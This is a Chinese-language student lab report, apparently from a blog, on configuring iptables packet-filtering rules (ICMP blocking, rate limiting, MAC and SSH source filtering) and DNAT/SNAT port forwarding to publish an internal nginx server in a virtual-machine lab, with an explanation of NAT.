<p>（4）阻断来自某个mac地址的数据包。</p>
<p>3.设置iptables规则，实现特定远端主机SSH连接本地主机</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>1.配置防火墙的虚拟机：kali</p>
<p>2.验证防火墙功能的虚拟机：ubuntu</p>
<p>3.软件：iptables</p>
<p>4.Windows平台SSH工具：putty</p>
<p>（网络连接均设置为仅主机模式）</p>
<h3 id="实验过程与结果"><a href="#实验过程与结果" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：查看主机信息并实现ping通"><a href="#步骤一：查看主机信息并实现ping通" class="headerlink" title="步骤一：查看主机信息并实现ping通"></a>步骤一：查看主机信息并实现ping通</h4><p>1.kali终端输入“ifconfig”，可知IP地址为192.168.32.129</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img1.png" alt="图1"></p>
<p>2.ubuntu终端输入“ifconfig”，可知IP地址为192.168.32.130</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img2.png" alt="图2"></p>
<p>3.kali ping通ubuntu。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img3.png" alt="图3"></p>
<p>4.ubuntu ping通kali。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img4.png" alt="图4"></p>
<h4 id="步骤二：设置iptables防火墙的包过滤规则"><a href="#步骤二：设置iptables防火墙的包过滤规则" class="headerlink" title="步骤二：设置iptables防火墙的包过滤规则"></a>步骤二：设置iptables防火墙的包过滤规则</h4><p>1.在kali终端输入以下命令，禁止所有主机ping本地主机。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img5.png" alt="图5"></p>
<p>2.此时再次在ubuntu中尝试ping kali发现无法ping通。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img6.png" alt="图6"></p>
<p>3.在kali终端输入以下命令，仅允许指定ip地址的ubuntu主机ping主机kali。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -I INPUT -p icmp -s 192.168.32.130 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img7.png" alt="图7"></p>
<p>4.此时ubuntu就又能ping通kali了。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img8.png" alt="图8"></p>
<p>5.为了保证两条规则的先后顺序，首先输入<strong>sudo iptables -F</strong>清空全部规则，再输入<strong>sudo iptables -I INPUT -p icmp -m limit –limjit 6&#x2F;min –limit-burst 1 -j ACCEPT</strong>命令加入允许每十秒通过一个ping包的规则，最后再加入禁止任何主机ping本地主机的规则，保证每十秒一个ping包的规则优先于后者。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -F</span><br><span class="line"><span class="built_in">sudo</span> iptables -I INPUT -p icmp -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 6/min --limit-burst 1 -j ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img9.png" alt="图9"></p>
<p>6.此时利用<strong>sudo iptables -L</strong>查看规则列表如下图所示，ACCEPT优先于REJECT。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -L</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img10.png" alt="图10"></p>
<p>7.设置完成后，此时ubuntu ping kali，每十秒成功发送一个ping包，其余时间无法ping通。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img11.png" alt="图11"></p>
<p>8.再次清空iptables规则后，在kali终端输入<strong>sudo iptables -I INPUT -p icmp -m mac –mac-source 00:0c:29:71:1d:82 -j DROP</strong>，阻断来自ubuntu的Mac地址00:0c:29:71:1d:82的数据包。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -F</span><br><span class="line"><span class="built_in">sudo</span> iptables -I INPUT -p icmp -m mac --mac-source 00:0c:29:6d:cc:fd -j DROP</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img12.png" alt="图12"></p>
<p>9.查看此时的规则列表如下，只有一条DROP规则。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img13.png" alt="图13"></p>
<p>10.此时ubuntu 无法ping通kali了。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img14.png" alt="图14"></p>
<h4 id="步骤三：实现特定远端主机SSH连接本地主机"><a href="#步骤三：实现特定远端主机SSH连接本地主机" class="headerlink" title="步骤三：实现特定远端主机SSH连接本地主机"></a>步骤三：实现特定远端主机SSH连接本地主机</h4><p>1.在kali终端分别执行<strong>sudo &#x2F;etc&#x2F;init.d&#x2F;ssh start</strong>和<strong>sudo &#x2F;etc&#x2F;init.d&#x2F;ssh status</strong>命令，启动kali的SSH服务并查看ssh服务器状态，使得客户端可以通过22端口连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /etc/init.d/ssh start</span><br><span class="line"><span class="built_in">sudo</span> /etc/init.d/ssh status</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img15.png" alt="图15"></p>
<p>2.在ubuntu终端输入<strong>ssh <a href="mailto:&#x6b;&#x61;&#x6c;&#x69;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x33;&#x32;&#x2e;&#x31;&#50;&#57;">&#x6b;&#x61;&#x6c;&#x69;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x33;&#x32;&#x2e;&#x31;&#50;&#57;</a></strong>，ubuntu客户端SSH连接服务器kali。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img16.png" alt="图16"></p>
<p>3.在windows 11主机命令行中也输入<strong>ssh</strong> <a href="mailto:kali@192.168.32.1292"><strong>kali@192.168.32.129</strong></a>，主机客户端SSH连接服务器kali。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img17.png" alt="图17"></p>
<p>4.在kali终端再次查看ssh服务器状态，发现SSH服务器上留下记录，两个客户端成功连接服务器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> journalctl -u ssh -f</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img18.png" alt="图18"></p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img19.png" alt="图19"></p>
<p>5.再次清空iptables规则后，在kali终端输入<strong>sudo iptables -I INPUT -p tcp –dport 22 -s 192.168.32.130 -j ACCEPT</strong>允许远端主机ubuntu进行SSH连接，再输入<strong>sudo iptables -A INPUT -p tcp –dport 22 -j DROP</strong>禁止其他远端主机SSH连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -F</span><br><span class="line"><span class="built_in">sudo</span> iptables -I INPUT -p tcp --dport 22 -s 192.168.32.130 -j ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -p tcp --dport 22 -j DROP</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img20.png" alt="图20"></p>
<p>6.在iptables中允许连接的客户端1ubuntu仍可远程SSH连接。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img21.png" alt="图21"></p>
<p>7.客户端2本机windows 11已经无法连接，显示“client_loop: send disconnect: Connection reset”。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/img22.png" alt="图22"></p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>在本次关于iptables防火墙配置的实验中，我深入学习了iptables这一Linux核心安全工具的基本操作与原理知识。iptables作为Linux系统中用于配置IPv4数据包过滤规则、实现网络地址转换（NAT）以及管理数据包队列的强大工具，其价值在于允许用户通过定义精细的规则集，主动控制网络数据包的流向与处理方式，从而构建起灵活而有效的网络安全策略，实现包括端口控制、访问限制及防御网络攻击在内的多种功能。</p>
<p>实验过程中，我首先熟悉了iptables的基本命令结构，包括对INPUT、FORWARD、OUTPUT等链的操作。随后，我着手设置具体的包过滤规则以完成一系列预定目标。首要任务是掌握如何限制ICMP协议，我们通过添加规则，将所有传入的ICMP回显请求包（即ping请求）丢弃，从而实现了禁止所有主机ping通本地主机的效果，这让我直观地理解了防火墙如何基于协议类型进行访问控制。</p>
<p>在此基础上，实验进一步提升了规则的精确性。我学习了如何使用-s参数指定源IP地址，通过设置一条允许特定IP主机ping的规则，并确保其位于默认的禁止规则之前，成功实现了仅允许该授权主机进行ping操作，而其他任何主机的请求均被阻断。这一正一反的规则设置，深刻体现了iptables规则顺序的重要性以及“白名单”策略的实现方法。</p>
<p>为了应对更复杂的流量整形需求，我们尝试使用了limit模块。通过配置-m limit –limit 6&#x2F;minute（即每分钟6个，约合每10秒1个）这样的参数，我们实现了对ICMP请求的频率限制。当 ping 包的到来速率超过此阈值时，超出的请求会被自动丢弃。这个实验环节让我认识到，iptables不仅能够进行简单的“允许”或“拒绝”判断，还能对流量速率进行智能管理，这对于缓解网络洪泛攻击等场景具有实用意义。</p>
<p>此外，我们还探索了基于数据链路层信息的过滤方式，即根据源MAC地址来阻断数据包。这通过-m mac –mac-source参数实现，尽管MAC地址过滤在跨路由器的场景下作用有限，但它让我了解到防火墙规则可以作用于网络模型的不同层次，为局域网内的安全控制提供了另一种手段。</p>
<p>最后，实验的重点转向了应用层的访问控制，即管理SSH远程连接。我们通过添加规则，允许来自特定远端IP地址的TCP 22端口连接，同时可以配置默认策略拒绝其他所有SSH连接尝试。这个过程巩固了我对基于端口和状态（如新建连接）进行过滤的理解，这是保障服务器远程管理安全的基础。</p>
<p>总而言之，本次实验不仅让我熟悉了iptables的各种命令参数和规则链概念，更重要的是通过亲手实践，使我清晰地认识到如何将理论上的安全策略转化为具体、可执行的防火墙规则。iptables的高度可定制性确实使其成为Linux系统网络管理与安全防御中不可或缺的利器。通过这次实践，我初步具备了利用iptables构建基础主机防火墙的能力，并对网络数据包的流动与控制有了更为具象化的认识。</p>
<h2 id="防火墙课后实验"><a href="#防火墙课后实验" class="headerlink" title="防火墙课后实验"></a>防火墙课后实验</h2><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><p>设置iptables规则，实现内网服务的发布：</p>
<p>1.配置网络环境，测试网络连通情况。</p>
<p>2.开启防火墙路由转发，设置iptables规则。</p>
<p>3.验证公网主机能否通过访问防火墙获得内网服务。</p>
<h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>1.两台虚拟机：一台配置防火墙、一台作为内网服务器</p>
<p>2.需一台虚拟机或<strong>物理主机</strong>作为公网主机</p>
<p>3.了解实验场景：假设PC2不能直接访问局域网内的电脑PC1上的服务，但PC2可以与firewall上的公网IP：192.168.2.254相互通讯，由此可以进行NAT的设置，让PC2访问firewall的公网地址上的服务，再由firewall对数据进行处理，将访问请求发送到内网PC1上。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p1.png" alt="图1"></p>
<h3 id="实验过程与结果-1"><a href="#实验过程与结果-1" class="headerlink" title="实验过程与结果"></a>实验过程与结果</h3><h4 id="步骤一：配置网络环境"><a href="#步骤一：配置网络环境" class="headerlink" title="步骤一：配置网络环境"></a>步骤一：配置网络环境</h4><p>1.首先给作为配置防火墙的主机ubuntu增设网卡，并设置两张网卡在不同的网络中。</p>
<p>（1）ifconfig查看ubuntu的IP地址。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p2.png" alt="图2"></p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p3.png" alt="图3"></p>
<p>（2）查看PC1（windows XP）的IP地址</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p4.png" alt="图4"></p>
<p>（3）查看PC2（windows 10）的IP地址</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p5.png" alt="图5"></p>
<p>2.由上图可知，网关的配置入下：</p>
<p>（1）内网IP：10.21.227.244，子网掩码：255.255.128.0</p>
<p>（2）公网IP：192.168.32.132，子网掩码：255.255.255.0</p>
<p>3.然后设置PC1（windows XP）的网络适配器，与firewall网络适配器ens33处于一个网段（Vmnet0）。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p6.png" alt="图6"></p>
<p>4.设置PC2（windows 10）的网络适配器，与firewall网络适配器ens37处于一个网段（Vmnet1）。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p7.png" alt="图7"></p>
<p>5.点击“开始”按钮找到控制面板，点击进入“网络和Internet-网络连接”，设置PC1的网关为firewall。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p8.png" alt="图8"></p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p9.png" alt="图9"></p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p10.png" alt="图10"></p>
<h4 id="步骤二：测试网络连通性"><a href="#步骤二：测试网络连通性" class="headerlink" title="步骤二：测试网络连通性"></a>步骤二：测试网络连通性</h4><p>1.PC1 windows xp和firewall kali可以互相ping通。</p>
<p>（1）PC1 ping通firewall。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p11.png" alt="图11"></p>
<p>（2）firewall ping通PC1。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p12.png" alt="图12"></p>
<p>2.PC2 windows 10和firewall kali可以互相ping通。</p>
<p>（1）PC2 ping通firewall。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p13.png" alt="图13"></p>
<p>（2）firewall ping通PC2。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p14.png" alt="图14"></p>
<p>3.PC1 windows XP和PC2 windows 10无法互ping。</p>
<p>（1）PC1 ping不通PC2。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p15.png" alt="图15"></p>
<p>（2）PC2 ping不通PC1。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p16.png" alt="图16"></p>
<h4 id="步骤三：开启防火墙的路由转发，设置NAT规则"><a href="#步骤三：开启防火墙的路由转发，设置NAT规则" class="headerlink" title="步骤三：开启防火墙的路由转发，设置NAT规则"></a>步骤三：开启防火墙的路由转发，设置NAT规则</h4><p>1.在ubuntu终端输入以下命令，开启firewall的路由转发。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p17.png" alt="图17"></p>
<p>2.在ubuntu终端输入以下命令，对公网来的访问数据设置DNAT规则，将其访问目标地址通过NAT修改由原ip（firewall）为提供服务的ip（PC1），以便将请求转发到内网对应IP上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i ens37 -p tcp -d 192.168.32.132 --dport 80 -j DNAT --to-destination 10.21.156.73</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p18.png" alt="图18"></p>
<p>3.在ubuntu终端输入以下命令，设置一条SNAT的规则，以便内网对公网数据访问的回应信息能够到达请求的客户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -o ens37 -p tcp -j SNAT --to-source 192.168.32.132</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p19.png" alt="图19"></p>
<p>4.在ubuntu终端输入以下两条命令，在FORWARD链上设置允许PC1 windows xp访问内网的规则。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -i ens37 -p tcp -d 10.21.156.73 --dport 80 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp -m state --state established,related -j ACCEPT</span><br></pre></td></tr></table></figure>

<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p20.png" alt="图20"></p>
<h4 id="步骤四：PC1启动nginx开启http服务，PC2验证通过firewall访问内网服务"><a href="#步骤四：PC1启动nginx开启http服务，PC2验证通过firewall访问内网服务" class="headerlink" title="步骤四：PC1启动nginx开启http服务，PC2验证通过firewall访问内网服务"></a>步骤四：PC1启动nginx开启http服务，PC2验证通过firewall访问内网服务</h4><p>1.解压nginx-1.1.0文件夹后放在C盘下。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p21.png" alt="图21"></p>
<p>2.在命令行中进入nginx-1.1.0文件夹后，输入“start nginx”命令，启动PC1的nginx开启http服务。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p22.png" alt="图22"></p>
<p>3.在PC1中打开任务管理器查看进程，可以找到nginx.exe进程，说明nginx服务启动成功。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p23.png" alt="图23"></p>
<p>4.在PC2中打开浏览器访问firewall的外网ip地址192.168.32.132，看到如图所示的nginx欢迎页面即为通过firewall的ip访问内网主机服务成功。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p24.png" alt="图24"></p>
<h4 id="步骤五：解释上述iptables规则并分析NAT的实现原理"><a href="#步骤五：解释上述iptables规则并分析NAT的实现原理" class="headerlink" title="步骤五：解释上述iptables规则并分析NAT的实现原理"></a>步骤五：解释上述iptables规则并分析NAT的实现原理</h4><p>1.开启firewall的路由转发</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的ip地址将包发往本机另一网卡，该网卡根据路由表继续发送数据包。这通常就是路由器所要实现的功能。</p>
<p>出于安全考虑，Linux系统默认是禁止数据包转发的。默认&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward该文件内容为0，即表示禁止数据包转发。1表示允许数据包转发，故使用echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward修改文件内容，将其内容修改为1，即开启firewall的路由转发。</p>
<p>2.首先了解局域网内封包的传送过程：</p>
<p>（1）先经过NAT table的PREROUTING链；</p>
<p>（2）经由路由判断确定这个封包是要进入本机与否，若不进入本机，则下一步；</p>
<p>（3）再经过Filter table的FORWARD链；</p>
<p>（4）通过NAT table的POSTROUTING链，最后传送出去。</p>
<p>3.对公网来的访问数据设置DNAT规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -i ens37 -p tcp -d 192.168.32.132 --dport 80 -j DNAT --to-destination 10.21.156.73</span><br></pre></td></tr></table></figure>

<p>（1）PREROUTING：在进行路由判断之前所要进行的规则。</p>
<p>（2）-A：在规则链的末尾加入新的规则。</p>
<p>（3）DNAT：目标地址转换，能够让外网用户访问局域网内不同的服务器。</p>
<p>本条规则即表示将ens37网段（外网）上发送给firewall（ubuntu）的包的目标地址在路由前就由firewall（ubuntu）的IP地址转换为HTTP服务器PC1（windows XP）的IP地址。</p>
<p>4.设置一条SNAT的规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -o ens37 -p tcp -j SNAT --to-source 192.168.32.132</span><br></pre></td></tr></table></figure>

<p>（1）POSTROUTING：在进行路由判断之后所要进行的规则。</p>
<p>（2）-A：在规则链的末尾加入新的规则。</p>
<p>（3）-p：匹配协议，如TCP、UDP、ICMP。</p>
<p>（4）SNAT：源地址转换，能够让多个内网用户通过一个外网地址上网。</p>
<p>本条规则即表示将ens37网段（外网）上发出的包的源地址在路由前就由firewall（ubuntu）在ens33（内网）的IP地址转换为ens37（外网）的ip地址。</p>
<p>5.在FORWARD链上设置允许访问内网的规则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -i ens37 -p tcp -d 10.21.156.73 --dport 80 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp -m state --state established,related -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>网络防火墙的主要职责是“过滤并转发”,在五链中只有INPUT、OUTPUT和FORWARD有filter(过滤)功能，要想实现转发，报文必须经过FORWARD链。因此，iptables的角色变为”网络防火墙”时，规则只能定义在FORWARD链。</p>
<p>第一条是网段ens37（外网）上发送给firewall的包都由HTTP服务器PC1（windows XP）的80端口接收，第二条是允许基础转发。</p>
<p>6.NAT的实现原理：</p>
<p>（1）NAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”。它是一个IETF标准，允许一个整体机构以一个公用IP（Internet Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p25.png" alt="图25"></p>
<p>（2）NAT的基本工作原理是，当私有网主机和公共网主机通信的IP包经过NAT网关时，将IP包中的源IP或目的IP在私有IP和NAT的公共IP之间进行转换。</p>
<p>（3）参考本次实验中的场景：</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p26.png" alt="图26"></p>
<p>如上图所示，NAT网关（firewall-ubuntu）有两个网络端口，其中外网（ens37）端口的IP地址为192.168.32.132，内网（ens33）端口的IP地址为10.21.227.244。</p>
<p>当外网的IP包目的IP为192.168.32.132时这个IP包就会经过NAT网关，NAY Gateway会将该IP包的目的地址转换为HTTP服务器的IP地址并转发至内网。此时的IP包（Dst&#x3D;10.21.156.73，Src&#x3D;10.21.227.244）中已经不含任何外网IP的信息，HTTP Server发出的响应IP包（Dst&#x3D;10.21.227.244，Src&#x3D;10.21.156.73）将被发送到NAT Gateway。</p>
<p>这时，NAT Gateway会将IP包的目的IP转换为外网中的主机IP并转发至外网。此时的IP包（Dst&#x3D;192.168.32.131，Src&#x3D;192.168.32.132）中则已经不含任何内网IP的信息。</p>
<p>至此，对于通信双方PC1和PC2而言，这种地址的转换过程是完全透明的。</p>
<h3 id="实验中出现的问题、原因和解决"><a href="#实验中出现的问题、原因和解决" class="headerlink" title="实验中出现的问题、原因和解决"></a>实验中出现的问题、原因和解决</h3><h4 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h4><p>问题：firewall ping不通PC2 win10</p>
<p>原因：windows 10的Windows Defender防火墙没有关闭。</p>
<p>解决办法：</p>
<p>（1）在windows 10虚拟机中找到我的电脑，右键选择“属性”。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p27.png" alt="图27"></p>
<p>（2）在属性中选择“控制面板主页”进入控制面板。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p28.png" alt="图28"></p>
<p>（3）选择“系统和安全-Windows防火墙”。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p29.png" alt="图29"></p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p30.png" alt="图30"></p>
<p>（4）在左侧“启用或关闭Windows防火墙”中关闭专用网络和公用网络下的Windows防火墙。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p31.png" alt="图31"></p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p32.png" alt="图32"></p>
<p>（5）关闭windows10防火墙后即可ping通。</p>
<h4 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h4><p>问题：firewall ubuntu和PC1 windows XP不能互相ping通。</p>
<p>原因：在设置PC1网关为ubuntu时，“使用下面的IP地址”中填写的IP地址是原XP的IP地址，并非加入网段vmnet0后的IP地址。</p>
<p>解决办法：</p>
<p>（1）首先将windows XP虚拟机网络连接模式修改回NAT连接模式，然后重新将其加入网段vmnet0，本地连接属性也修改回“自动获得IP地址”。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p33.png" alt="图33"></p>
<p>（2）此时再使用ipconfig命令查看PC1的IP地址，可知加入网段vmnet0后PC2的IP地址为10.21.156.73。</p>
<p>（3）然后再修改本地连接中Internet协议的属性为“使用下面的IP地址”，其中IP地址为PC1加入网段vmnet0后的IP地址10.21.156.73，子网掩码和默认网关为ubuntu内网的子网掩码和IP地址。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p34.png" alt="图34"></p>
<p>（4）修改完成后即成功设置好PC1，PC1和firewall可以实现ping通。</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p35.png" alt="图35"></p>
<p>PC1(windows xp)ping通firewall(ubuntu)</p>
<p><img src="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/p36.png" alt="图36"></p>
<p>firewall(ubuntu)ping通PC1(windows xp)</p>
